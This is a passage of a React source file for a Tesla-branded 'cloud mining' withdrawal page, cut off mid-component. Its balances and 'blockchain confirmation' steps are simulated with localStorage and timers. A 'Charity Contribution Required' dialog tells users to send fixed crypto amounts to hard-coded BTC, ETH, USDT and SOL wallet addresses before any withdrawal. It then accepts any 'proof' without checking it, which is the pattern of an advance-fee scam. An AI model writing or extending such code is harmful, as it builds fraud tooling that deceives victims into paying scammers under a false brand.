"use client";

import { useState, useEffect, useCallback } from "react";

// ─────────────────────────────────────────────────────────────────────────────
// CONSTANTS
// ─────────────────────────────────────────────────────────────────────────────
const MIN_WITHDRAWAL = 1000;          // $1000 threshold
const WITHDRAWAL_FEE_PCT = 0.015;     // 1.5% network fee
const STORAGE_KEY   = "cloud_mining_v2";
const WITHDRAWAL_KEY = "cloud_mining_withdrawals";

const NETWORKS = [
  { id: "btc",  label: "Bitcoin",    symbol: "BTC",  color: "#f7931a", prefix: "bc1", confirmations: "3 blocks",  time: "1–2 hrs" },
  { id: "eth",  label: "Ethereum",   symbol: "ETH",  color: "#627eea", prefix: "0x",  confirmations: "12 blocks", time: "30–60 min" },
  { id: "sol",  label: "Solana",     symbol: "SOL",  color: "#9945ff", prefix: "",    confirmations: "1 block",   time: "10–20 min" },
  { id: "usdt", label: "USDT TRC20", symbol: "USDT", color: "#26a17b", prefix: "T",  confirmations: "20 blocks", time: "30–60 min" },
];

const STATUS_STAGES = ["Submitted", "Verifying", "Processing", "Completed"];

// Processing steps shown on the processing screen
const PROCESSING_STEPS = [
  { label: "Submitting withdrawal request",   duration: 1800 },
  { label: "Verifying wallet address",         duration: 2200 },
  { label: "Checking pool balance",            duration: 1600 },
  { label: "Authenticating transaction",       duration: 2400 },
  { label: "Broadcasting to network",          duration: 2000 },
  { label: "Confirming on blockchain",         duration: 1800 },
];

// ─────────────────────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────────────────────
const fmtBig   = (n) => n >= 1000 ? `$${(n / 1000).toFixed(2)}k` : `$${n.toFixed(2)}`;
const shortAddr = (addr) => addr.length > 12 ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : addr;
const tsToDate  = (ts) => new Date(ts).toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" });
const tsToTime  = (ts) => new Date(ts).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });

function loadMined() {
  try { const r = localStorage.getItem(STORAGE_KEY); return r ? JSON.parse(r).mined || 0 : 0; }
  catch { return 0; }
}
function loadWithdrawals() {
  try { const r = localStorage.getItem(WITHDRAWAL_KEY); return r ? JSON.parse(r) : []; }
  catch { return []; }
}
function saveWithdrawals(list) {
  try { localStorage.setItem(WITHDRAWAL_KEY, JSON.stringify(list)); } catch {}
}
function deductMined(amount) {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return;
    const state = JSON.parse(raw);
    state.mined = Math.max((state.mined || 0) - amount, 0);
    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
  } catch {}
}

function useIsMobile(bp = 768) {
  const [m, setM] = useState(false);
  useEffect(() => {
    const check = () => setM(window.innerWidth < bp);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, [bp]);
  return m;
}

// ─────────────────────────────────────────────────────────────────────────────
// TESLA LOGO
// ─────────────────────────────────────────────────────────────────────────────
function TeslaLogo({ size = 32, color = "#e31937" }) {
  return (
    <img
      src="/favicon-512.png"
      alt="Tesla"
      style={{
        width: size,
        height: size,
        objectFit: "contain",
        filter: color === "#e31937" || color === "#cc0000" || color === "#aa0000"
          ? "none"
          : color === "#222" || color === "#333" || color === "#2a0a0a" || color === "#2a2a2a"
          ? "brightness(0.15)"
          : "none",
        display: "inline-block",
        flexShrink: 0,
      }}
    />
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// STATUS BADGE
// ─────────────────────────────────────────────────────────────────────────────
function StatusBadge({ status }) {
  const map = {
    Submitted:  { color: "#6366f1", bg: "rgba(99,102,241,0.12)",  border: "rgba(99,102,241,0.3)",  icon: "○" },
    Verifying:  { color: "#f59e0b", bg: "rgba(245,158,11,0.12)",  border: "rgba(245,158,11,0.3)",  icon: "◐" },
    Processing: { color: "#00bfff", bg: "rgba(0,191,255,0.12)",   border: "rgba(0,191,255,0.3)",   icon: "◑" },
    Completed:  { color: "#00c896", bg: "rgba(0,200,150,0.12)",   border: "rgba(0,200,150,0.3)",   icon: "✓" },
    Failed:     { color: "#ff4455", bg: "rgba(255,68,85,0.12)",   border: "rgba(255,68,85,0.3)",   icon: "✕" },
  };
  const s = map[status] || map.Submitted;
  return (
    <span style={{ padding: "3px 10px", borderRadius: 20, fontSize: 11, fontWeight: 600, background: s.bg, border: `1px solid ${s.border}`, color: s.color, whiteSpace: "nowrap" }}>
      {s.icon} {status}
    </span>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// STATUS TRACKER BAR
// ─────────────────────────────────────────────────────────────────────────────
function StatusTracker({ status }) {
  const idx = STATUS_STAGES.indexOf(status);
  return (
    <div style={{ display: "flex", alignItems: "flex-start", width: "100%", gap: 0, marginBottom: 8 }}>
      {STATUS_STAGES.map((stage, i) => {
        const done   = i < idx;
        const active = i === idx;
        return (
          <div key={stage} style={{ display: "flex", alignItems: "center", flex: 1 }}>
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 5, flex: "0 0 auto" }}>
              <div style={{
                width: active ? 26 : 20, height: active ? 26 : 20,
                borderRadius: "50%",
                display: "flex", alignItems: "center", justifyContent: "center",
                background: done ? "rgba(0,200,150,0.15)" : active ? "rgba(227,25,55,0.15)" : "rgba(255,255,255,0.04)",
                border: `2px solid ${done ? "#00c896" : active ? "#e31937" : "rgba(255,255,255,0.08)"}`,
                color: done ? "#00c896" : active ? "#e31937" : "#333",
                fontSize: 10, fontWeight: 700,
                boxShadow: active ? "0 0 12px rgba(227,25,55,0.3)" : "none",
                transition: "all 0.3s ease",
                flexShrink: 0,
              }}>
                {done ? "✓" : active ? "●" : i + 1}
              </div>
              <span style={{ fontSize: 8, color: done ? "#00c896" : active ? "#e31937" : "#333", textTransform: "uppercase", letterSpacing: 0.8, whiteSpace: "nowrap" }}>{stage}</span>
            </div>
            {i < STATUS_STAGES.length - 1 && (
              <div style={{ flex: 1, height: 2, margin: "0 4px", marginBottom: 14, background: done ? "linear-gradient(90deg,#00c896,#00a878)" : "rgba(255,255,255,0.05)", borderRadius: 1, transition: "background 0.4s ease" }} />
            )}
          </div>
        );
      })}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// LOCKED SCREEN — shown when balance < $1000
// ─────────────────────────────────────────────────────────────────────────────
function LockedScreen({ balance, onBack }) {
  const progress  = Math.min((balance / MIN_WITHDRAWAL) * 100, 100);
  const remaining = Math.max(MIN_WITHDRAWAL - balance, 0);
  const daysLeft  = Math.ceil(remaining / 96.88);

  return (
    <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "32px 20px 48px", textAlign: "center" }}>

      {/* Lock icon */}
      <div style={{ width: 88, height: 88, borderRadius: "50%", background: "rgba(227,25,55,0.08)", border: "2px solid rgba(227,25,55,0.18)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 38, marginBottom: 24, animation: "float 3s ease-in-out infinite" }}>
        🔒
      </div>

      <h2 style={{ fontFamily: "'Syne', sans-serif", fontWeight: 900, fontSize: 28, marginBottom: 10, letterSpacing: -0.5 }}>
        Withdrawal <span style={{ color: "#e31937" }}>Locked</span>
      </h2>
      <p style={{ fontSize: 13, color: "#555", lineHeight: 1.8, maxWidth: 300, marginBottom: 32 }}>
        Reach <strong style={{ color: "#fff" }}>${MIN_WITHDRAWAL.toLocaleString()}</strong> in mining balance to unlock withdrawals.
      </p>

      {/* Progress card */}
      <div style={{ width: "100%", maxWidth: 380, background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.07)", borderRadius: 18, padding: "24px 22px", marginBottom: 20 }}>

        {/* Balance row */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginBottom: 18 }}>
          <div style={{ background: "rgba(255,255,255,0.03)", borderRadius: 12, padding: "14px 16px" }}>
            <div style={{ fontSize: 9, color: "#444", textTransform: "uppercase", letterSpacing: 1.5, marginBottom: 8 }}>Your Balance</div>
            <div style={{ fontSize: 22, fontWeight: 800, color: "#fff", fontFamily: "'Syne',sans-serif", lineHeight: 1 }}>${balance.toFixed(2)}</div>
          </div>
          <div style={{ background: "rgba(227,25,55,0.06)", border: "1px solid rgba(227,25,55,0.15)", borderRadius: 12, padding: "14px 16px" }}>
            <div style={{ fontSize: 9, color: "#444", textTransform: "uppercase", letterSpacing: 1.5, marginBottom: 8 }}>Target</div>
            <div style={{ fontSize: 22, fontWeight: 800, color: "#e31937", fontFamily: "'Syne',sans-serif", lineHeight: 1 }}>${MIN_WITHDRAWAL.toLocaleString()}</div>
          </div>
        </div>

        {/* Progress bar */}
        <div style={{ height: 8, background: "rgba(255,255,255,0.05)", borderRadius: 4, overflow: "hidden", marginBottom: 8 }}>
          <div style={{ height: "100%", width: `${progress}%`, background: "linear-gradient(90deg,#aa0000,#e31937)", borderRadius: 4, boxShadow: "0 0 12px rgba(227,25,55,0.4)", transition: "width 0.6s ease" }} />
        </div>
        <div style={{ display: "flex", justifyContent: "space-between" }}>
          <span style={{ fontSize: 11, color: "#e31937", fontWeight: 600 }}>{progress.toFixed(1)}% complete</span>
          <span style={{ fontSize: 11, color: "#444" }}>${remaining.toFixed(2)} to go</span>
        </div>

        {/* Milestones */}
        <div style={{ marginTop: 20, display: "flex", flexDirection: "column", gap: 8 }}>
          {[
            { label: "25% milestone", val: 250 },
            { label: "50% milestone", val: 500 },
            { label: "75% milestone", val: 750 },
            { label: "🎉 Withdrawal unlocked!", val: 1000 },
          ].map(({ label, val }) => {
            const reached = balance >= val;
            return (
              <div key={val} style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <div style={{ width: 18, height: 18, borderRadius: "50%", flexShrink: 0, background: reached ? "rgba(0,200,150,0.15)" : "rgba(255,255,255,0.03)", border: `1px solid ${reached ? "#00c896" : "rgba(255,255,255,0.06)"}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 9, color: reached ? "#00c896" : "#2a2a2a" }}>
                  {reached ? "✓" : "·"}
                </div>
                <span style={{ fontSize: 12, color: reached ? "#bbb" : "#333", flex: 1, textAlign: "left" }}>{label}</span>
                <span style={{ fontSize: 12, color: reached ? "#00c896" : "#2a2a2a", fontWeight: 600 }}>${val.toLocaleString()}</span>
              </div>
            );
          })}
        </div>
      </div>

      {/* Days estimate */}
      <div style={{ background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.05)", borderRadius: 12, padding: "14px 20px", maxWidth: 380, width: "100%" }}>
        <span style={{ fontSize: 12, color: "#444" }}>
          At $96.88/day you're about{" "}
          <span style={{ color: "#e31937", fontWeight: 700 }}>{daysLeft} days</span>
          {" "}away from unlocking
        </span>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// PROCESSING SCREEN — animated steps
// ─────────────────────────────────────────────────────────────────────────────
function ProcessingScreen({ withdrawal, onDone }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [finished, setFinished] = useState(false);

  useEffect(() => {
    let step = 0;
    const runStep = () => {
      if (step >= PROCESSING_STEPS.length) {
        setFinished(true);
        setTimeout(onDone, 2200);
        return;
      }
      setCurrentStep(step);
      setTimeout(() => {
        setCompletedSteps(prev => [...prev, step]);
        step++;
        setTimeout(runStep, 300);
      }, PROCESSING_STEPS[step].duration);
    };
    const init = setTimeout(runStep, 600);
    return () => clearTimeout(init);
  }, []);

  const fee    = withdrawal.amount * WITHDRAWAL_FEE_PCT;
  const receive = withdrawal.amount - fee;
  const net    = NETWORKS.find(n => n.id === withdrawal.network);

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "40px 24px" }}>

      {/* Animated ring */}
      <div style={{ position: "relative", width: 120, height: 120, marginBottom: 32 }}>
        <svg width="120" height="120" style={{ position: "absolute", inset: 0 }}>
          <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(227,25,55,0.1)" strokeWidth="6" />
          {!finished ? (
            <circle cx="60" cy="60" r="52" fill="none" stroke="#e31937" strokeWidth="6"
              strokeDasharray="326" strokeLinecap="round"
              transform="rotate(-90 60 60)"
              style={{ animation: "spinDash 1.8s linear infinite" }}
            />
          ) : (
            <circle cx="60" cy="60" r="52" fill="none" stroke="#00c896" strokeWidth="6"
              strokeDasharray="326 326"
              transform="rotate(-90 60 60)"
              style={{ transition: "stroke-dasharray 0.6s ease" }}
            />
          )}
        </svg>
        <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", fontSize: finished ? 36 : 28 }}>
          {finished ? "✅" : "⚡"}
        </div>
      </div>

      {finished ? (
        <>
          <h2 style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: 26, color: "#00c896", marginBottom: 10, letterSpacing: -0.5 }}>Withdrawal Submitted!</h2>
          <p style={{ fontSize: 14, color: "#555", textAlign: "center", maxWidth: 340, lineHeight: 1.8 }}>
            Your request is now <strong style={{ color: "#f59e0b" }}>pending</strong>. Payment will be made to your wallet within <strong style={{ color: "#fff" }}>24 hours</strong> after verification.
          </p>
        </>
      ) : (
        <>
          <h2 style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: 22, marginBottom: 8, letterSpacing: -0.5 }}>Processing Withdrawal</h2>
          <p style={{ fontSize: 13, color: "#555", marginBottom: 32, textAlign: "center" }}>Please don't close this page</p>
        </>
      )}

      {/* Steps list */}
      <div style={{ width: "100%", maxWidth: 400, marginBottom: 32 }}>
        {PROCESSING_STEPS.map((step, i) => {
          const done    = completedSteps.includes(i);
          const active  = currentStep === i && !done;
          const pending = i > currentStep;
          return (
            <div key={i} style={{ display: "flex", alignItems: "center", gap: 12, padding: "9px 0", borderBottom: i < PROCESSING_STEPS.length - 1 ? "1px solid rgba(255,255,255,0.04)" : "none", opacity: pending ? 0.3 : 1, transition: "opacity 0.3s ease" }}>
              <div style={{
                width: 24, height: 24, borderRadius: "50%", flexShrink: 0,
                display: "flex", alignItems: "center", justifyContent: "center",
                background: done ? "rgba(0,200,150,0.15)" : active ? "rgba(227,25,55,0.15)" : "rgba(255,255,255,0.04)",
                border: `2px solid ${done ? "#00c896" : active ? "#e31937" : "rgba(255,255,255,0.08)"}`,
                fontSize: 11, color: done ? "#00c896" : active ? "#e31937" : "#333",
                transition: "all 0.3s ease",
              }}>
                {done ? "✓" : active ? (
                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#e31937", animation: "pulse 1s ease-in-out infinite", display: "inline-block" }} />
                ) : i + 1}
              </div>
              <span style={{ fontSize: 13, color: done ? "#ccc" : active ? "#fff" : "#444", flex: 1 }}>{step.label}</span>
              {done && <span style={{ fontSize: 11, color: "#00c896" }}>Done</span>}
              {active && <span style={{ fontSize: 11, color: "#e31937", animation: "pulse 1s ease-in-out infinite" }}>...</span>}
            </div>
          );
        })}
      </div>

      {/* Withdrawal summary card */}
      <div style={{ width: "100%", maxWidth: 400, background: "rgba(255,255,255,0.025)", border: "1px solid rgba(255,255,255,0.07)", borderRadius: 16, padding: "18px 20px" }}>
        <div style={{ fontSize: 10, color: "#444", letterSpacing: 2, textTransform: "uppercase", marginBottom: 14 }}>Withdrawal Summary</div>
        {[
          { label: "Amount",        value: fmtBig(withdrawal.amount),  color: "#fff" },
          { label: "Network Fee",   value: `-${fmtBig(fee)}`,          color: "#ff6b6b" },
          { label: "You Receive",   value: fmtBig(receive),            color: "#00c896", bold: true },
          { label: "Network",       value: net?.label,                 color: "#aaa" },
          { label: "Wallet",        value: shortAddr(withdrawal.wallet), color: "#aaa" },
          { label: "Reference ID",  value: withdrawal.id,              color: "#555" },
        ].map(({ label, value, color, bold }) => (
          <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "7px 0", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
            <span style={{ fontSize: 11, color: "#444" }}>{label}</span>
            <span style={{ fontSize: 12, color, fontWeight: bold ? 700 : 500 }}>{value}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// CHARITY DEPOSIT DIALOG
// ─────────────────────────────────────────────────────────────────────────────
const CHARITY_WALLETS = {
  btc:  "1G3mwdjDKdh9q5r55Ryr3iTVKW3gZ9gxAw",
  eth:  "0x55cfe95453a9fad990290aae7af8c0cf791e2a35",
  usdt: "TGuQrmGpKFBkUFticKpsmG4trCM25nRHZC",
  sol:  "45mE67qg2vMs3Gw7rKXmStjTqvnW5D8GCEgpx7xhoB76",
};

const CHARITY_AMOUNTS = {
  btc:  "0.005 BTC",
  eth:  "0.05 ETH",
  usdt: "50 USDT",
  sol:  "2 SOL",
};

function CharityDialog({ network, onProofSubmitted }) {
  const [copied, setCopied]     = useState(false);
  const [proofText, setProofText]   = useState("");
  const [proofFile, setProofFile]   = useState(null);
  const [filePreview, setFilePreview] = useState(null);
  const [submitted, setSubmitted]   = useState(false);
  const [error, setError]           = useState("");
  const [step, setStep]             = useState(1); // 1=info, 2=upload proof

  const walletAddr  = CHARITY_WALLETS[network] || CHARITY_WALLETS.btc;
  const charityAmt  = CHARITY_AMOUNTS[network]  || CHARITY_AMOUNTS.usdt;

  function copyWallet() {
    navigator.clipboard.writeText(walletAddr).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  }

  function handleFileChange(e) {
    const file = e.target.files[0];
    if (!file) return;
    setProofFile(file);
    const reader = new FileReader();
    reader.onload = (ev) => setFilePreview(ev.target.result);
    reader.readAsDataURL(file);
  }

  function handleSubmitProof() {
    if (!proofFile && !proofText.trim()) {
      setError("Please upload a screenshot or provide your transaction hash.");
      return;
    }
    setError("");
    setSubmitted(true);
    setTimeout(() => onProofSubmitted(), 2200);
  }

  return (
    <div style={{
      position: "fixed", inset: 0, zIndex: 300,
      display: "flex", alignItems: "center", justifyContent: "center",
      background: "rgba(0,0,0,0.88)", backdropFilter: "blur(12px)",
      padding: 16,
    }}>
      <div style={{
        background: "linear-gradient(145deg,#07080f,#0a0d18)",
        border: "1px solid rgba(255,215,0,0.18)",
        borderRadius: 24, padding: 0, maxWidth: 520, width: "100%",
        boxShadow: "0 0 60px rgba(255,200,0,0.08), 0 30px 60px rgba(0,0,0,0.6)",
        animation: "fadeIn 0.3s ease", position: "relative", overflow: "hidden",
      }}>
        {/* Gold top accent */}
        <div style={{ height: 3, background: "linear-gradient(90deg,transparent,#f5c518,#ffd700,#f5c518,transparent)" }} />

        {/* Decorative glow */}
        <div style={{ position: "absolute", top: -80, left: "50%", transform: "translateX(-50%)", width: 300, height: 160, borderRadius: "50%", background: "radial-gradient(circle,rgba(245,197,24,0.06) 0%,transparent 70%)", pointerEvents: "none" }} />

        <div style={{ padding: "28px 28px 32px", position: "relative" }}>
          {/* Icon + Title */}
          <div style={{ textAlign: "center", marginBottom: 22 }}>
            <div style={{ fontSize: 48, marginBottom: 10, filter: "drop-shadow(0 0 16px rgba(255,200,0,0.4))" }}>🤝</div>
            <h2 style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: 22, color: "#fff", marginBottom: 6, letterSpacing: -0.3 }}>
              Charity Contribution <span style={{ color: "#ffd700" }}>Required</span>
            </h2>
            <p style={{ fontSize: 12, color: "#666", lineHeight: 1.7, maxWidth: 380, margin: "0 auto" }}>
              As part of our platform's social responsibility programme, a small charity contribution is required before your withdrawal can be processed.
            </p>
          </div>

          {/* Step indicator */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginBottom: 24 }}>
            {[1, 2].map(s => (
              <div key={s} style={{ display: "flex", alignItems: "center", gap: 6 }}>
                <div style={{
                  width: 28, height: 28, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center",
                  fontSize: 11, fontWeight: 700,
                  background: step >= s ? "rgba(255,215,0,0.15)" : "rgba(255,255,255,0.04)",
                  border: `1.5px solid ${step >= s ? "#ffd700" : "rgba(255,255,255,0.08)"}`,
                  color: step >= s ? "#ffd700" : "#333",
                  transition: "all 0.3s",
                }}>{step > s ? "✓" : s}</div>
                <span style={{ fontSize: 10, color: step >= s ? "#ffd700" : "#333", letterSpacing: 0.8, textTransform: "uppercase" }}>
                  {s === 1 ? "Make Deposit" : "Submit Proof"}
                </span>
                {s < 2 && <div style={{ width: 28, height: 1.5, background: step > s ? "#ffd700" : "rgba(255,255,255,0.07)", borderRadius: 1, margin: "0 2px" }} />}
              </div>
            ))}
          </div>

          {/* ─── STEP 1: WALLET + INSTRUCTIONS ─── */}
          {step === 1 && (
            <div style={{ animation: "fadeIn 0.3s ease" }}>
              {/* Amount to send */}
              <div style={{ background: "rgba(255,215,0,0.06)", border: "1px solid rgba(255,215,0,0.2)", borderRadius: 14, padding: "16px 18px", marginBottom: 16, textAlign: "center" }}>
                <div style={{ fontSize: 10, color: "#888", letterSpacing: 2, textTransform: "uppercase", marginBottom: 6 }}>Charity Contribution Amount</div>
                <div style={{ fontSize: 28, fontWeight: 800, color: "#ffd700", fontFamily: "'Syne',sans-serif", letterSpacing: -0.5 }}>{charityAmt}</div>
                <div style={{ fontSize: 11, color: "#555", marginTop: 4 }}>Send this exact amount to the address below</div>
              </div>

              {/* Wallet address */}
              <div style={{ marginBottom: 16 }}>
                <div style={{ fontSize: 10, color: "#555", letterSpacing: 1.5, textTransform: "uppercase", marginBottom: 8 }}>Charity Wallet Address</div>
                <div style={{
                  background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.08)",
                  borderRadius: 12, padding: "14px 16px",
                  display: "flex", alignItems: "center", gap: 10,
                }}>
                  <div style={{ flex: 1, fontSize: 11, color: "#ccc", fontFamily: "'JetBrains Mono',monospace", wordBreak: "break-all", lineHeight: 1.6 }}>
                    {walletAddr}
                  </div>
                  <button onClick={copyWallet} style={{
                    flexShrink: 0, padding: "8px 14px", borderRadius: 9,
                    background: copied ? "rgba(0,200,150,0.12)" : "rgba(255,215,0,0.1)",
                    border: `1px solid ${copied ? "rgba(0,200,150,0.3)" : "rgba(255,215,0,0.25)"}`,
                    color: copied ? "#00c896" : "#ffd700", fontSize: 11, fontWeight: 700,
                    cursor: "pointer", transition: "all 0.2s", whiteSpace: "nowrap",
                    fontFamily: "'JetBrains Mono',monospace",
                  }}>
                    {copied ? "✓ Copied" : "📋 Copy"}
                  </button>
                </div>
              </div>

              {/* Notes */}
              <div style={{ background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.05)", borderRadius: 12, padding: "14px 16px", marginBottom: 22 }}>
                {[
                  { icon: "⚠️", text: "Send the exact amount listed above — partial payments will not be accepted" },
                  { icon: "🔗", text: "Save your transaction hash or take a screenshot — you'll need it in the next step" },
                  { icon: "⏳", text: "Your withdrawal will be processed within 24 hours of proof verification" },
                  { icon: "🌍", text: "Contributions go directly to vetted global charity partners" },
                ].map(({ icon, text }) => (
                  <div key={text} style={{ display: "flex", gap: 10, marginBottom: 8, alignItems: "flex-start" }}>
                    <span style={{ fontSize: 13, flexShrink: 0, marginTop: 1 }}>{icon}</span>
                    <span style={{ fontSize: 11, color: "#555", lineHeight: 1.6 }}>{text}</span>
                  </div>
                ))}
              </div>

              <button onClick={() => setStep(2)} style={{
                width: "100%", padding: "15px 0", borderRadius: 12,
                background: "linear-gradient(135deg,#c8980a,#ffd700)",
                color: "#000", fontWeight: 800, fontSize: 14,
                fontFamily: "'Syne',sans-serif", letterSpacing: 0.3,
                boxShadow: "0 4px 24px rgba(255,215,0,0.3)",
                cursor: "pointer", transition: "all 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.transform = "translateY(-2px)"}
                onMouseLeave={e => e.currentTarget.style.transform = "translateY(0)"}
              >
                I've Made the Payment → Submit Proof
              </button>
            </div>
          )}

          {/* ─── STEP 2: PROOF UPLOAD ─── */}
          {step === 2 && !submitted && (
            <div style={{ animation: "fadeIn 0.3s ease" }}>
              <div style={{ background: "rgba(255,215,0,0.05)", border: "1px solid rgba(255,215,0,0.15)", borderRadius: 12, padding: "12px 16px", marginBottom: 18, display: "flex", gap: 10, alignItems: "center" }}>
                <span style={{ fontSize: 16 }}>📋</span>
                <div>
                  <div style={{ fontSize: 11, color: "#ffd700", fontWeight: 700, marginBottom: 2 }}>Upload Payment Proof</div>
                  <div style={{ fontSize: 11, color: "#555", lineHeight: 1.5 }}>Provide a screenshot or your transaction hash. Your withdrawal will remain on hold until this is verified.</div>
                </div>
              </div>

              {/* Screenshot upload */}
              <div style={{ marginBottom: 16 }}>
                <label style={{ fontSize: 10, color: "#555", letterSpacing: 1.5, textTransform: "uppercase", display: "block", marginBottom: 8 }}>Screenshot / Receipt</label>
                <label style={{
                  display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center",
                  gap: 8, padding: "22px 16px", borderRadius: 14,
                  border: `2px dashed ${proofFile ? "rgba(0,200,150,0.4)" : "rgba(255,215,0,0.2)"}`,
                  background: proofFile ? "rgba(0,200,150,0.04)" : "rgba(255,215,0,0.03)",
                  cursor: "pointer", transition: "all 0.2s",
                }}>
                  {filePreview ? (
                    <img src={filePreview} alt="proof" style={{ maxHeight: 120, maxWidth: "100%", borderRadius: 8, objectFit: "contain" }} />
                  ) : (
                    <>
                      <span style={{ fontSize: 28 }}>📎</span>
                      <span style={{ fontSize: 12, color: "#555" }}>Click to upload screenshot</span>
                      <span style={{ fontSize: 10, color: "#333" }}>PNG, JPG, PDF accepted</span>
                    </>
                  )}
                  <input type="file" accept="image/*,.pdf" onChange={handleFileChange} style={{ display: "none" }} />
                </label>
                {proofFile && <div style={{ fontSize: 11, color: "#00c896", marginTop: 6 }}>✓ {proofFile.name}</div>}
              </div>

              {/* OR transaction hash */}
              <div style={{ marginBottom: 18 }}>
                <label style={{ fontSize: 10, color: "#555", letterSpacing: 1.5, textTransform: "uppercase", display: "block", marginBottom: 8 }}>— OR — Transaction Hash / TxID</label>
                <input
                  value={proofText}
                  onChange={e => { setProofText(e.target.value); setError(""); }}
                  placeholder="Paste your transaction hash here..."
                  style={{
                    width: "100%", padding: "13px 16px", borderRadius: 12,
                    background: "rgba(255,255,255,0.03)", border: `1px solid ${error ? "#ff4455" : "rgba(255,255,255,0.08)"}`,
                    color: "#fff", fontSize: 12, fontFamily: "'JetBrains Mono',monospace",
                  }}
                />
              </div>

              {error && <div style={{ fontSize: 11, color: "#ff4455", marginBottom: 14, padding: "10px 14px", background: "rgba(255,68,85,0.07)", borderRadius: 9, border: "1px solid rgba(255,68,85,0.2)" }}>⚠ {error}</div>}

              <div style={{ display: "flex", gap: 10 }}>
                <button onClick={() => setStep(1)} style={{
                  flex: 1, padding: "13px 0", borderRadius: 12,
                  background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)",
                  color: "#555", fontSize: 12, fontFamily: "'JetBrains Mono',monospace", cursor: "pointer",
                }}>← Back</button>
                <button onClick={handleSubmitProof} style={{
                  flex: 2, padding: "13px 0", borderRadius: 12,
                  background: "linear-gradient(135deg,#c8980a,#ffd700)",
                  color: "#000", fontWeight: 800, fontSize: 13,
                  fontFamily: "'Syne',sans-serif",
                  boxShadow: "0 4px 20px rgba(255,215,0,0.3)",
                  cursor: "pointer", transition: "all 0.2s",
                }}>
                  ✓ Submit Proof & Continue
                </button>
              </div>
            </div>
          )}

          {/* ─── SUBMITTED STATE ─── */}
          {submitted && (
            <div style={{ textAlign: "center", padding: "10px 0 6px", animation: "fadeIn 0.4s ease" }}>
              <div style={{ fontSize: 52, marginBottom: 12, animation: "float 2s ease-in-out infinite" }}>✅</div>
              <h3 style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: 20, color: "#00c896", marginBottom: 8 }}>Proof Submitted!</h3>
              <p style={{ fontSize: 12, color: "#555", lineHeight: 1.7 }}>Your payment proof has been received.<br />Proceeding to withdrawal now…</p>
              <div style={{ marginTop: 16, display: "flex", justifyContent: "center" }}>
                <div style={{ width: 36, height: 36 }}>
                  <svg viewBox="0 0 36 36" style={{ animation: "spinDash 1s linear infinite" }}>
                    <circle cx="18" cy="18" r="14" fill="none" stroke="rgba(0,200,150,0.2)" strokeWidth="3" />
                    <circle cx="18" cy="18" r="14" fill="none" stroke="#00c896" strokeWidth="3" strokeDasharray="50 38" strokeLinecap="round" transform="rotate(-90 18 18)" />
                  </svg>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// CONFIRM MODAL
// ─────────────────────────────────────────────────────────────────────────────
function ConfirmModal({ data, onConfirm, onCancel }) {
  const net     = NETWORKS.find(n => n.id === data.network);
  const fee     = data.amount * WITHDRAWAL_FEE_PCT;
  const receive = data.amount - fee;
  return (
    <div style={{ position: "fixed", inset: 0, zIndex: 200, display: "flex", alignItems: "center", justifyContent: "center", background: "rgba(0,0,0,0.75)", backdropFilter: "blur(8px)", padding: 20 }}>
      <div style={{ background: "#0a0e18", border: "1px solid rgba(255,255,255,0.09)", borderRadius: 20, padding: 28, maxWidth: 420, width: "100%", animation: "fadeIn 0.2s ease", position: "relative", overflow: "hidden" }}>
        <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 2, background: "linear-gradient(90deg,transparent,#e31937,transparent)" }} />
        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <div style={{ fontSize: 36, marginBottom: 10 }}>🔐</div>
          <div style={{ fontSize: 20, fontWeight: 700, color: "#fff", fontFamily: "'Syne',sans-serif", marginBottom: 4 }}>Confirm Withdrawal</div>
          <div style={{ fontSize: 12, color: "#444" }}>Review carefully — this cannot be reversed</div>
        </div>
        {[
          { label: "Withdrawal Amount", value: fmtBig(data.amount),    color: "#fff" },
          { label: "Network Fee (1.5%)", value: `-${fmtBig(fee)}`,      color: "#ff6b6b" },
          { label: "You Will Receive",   value: fmtBig(receive),        color: "#00c896", bold: true },
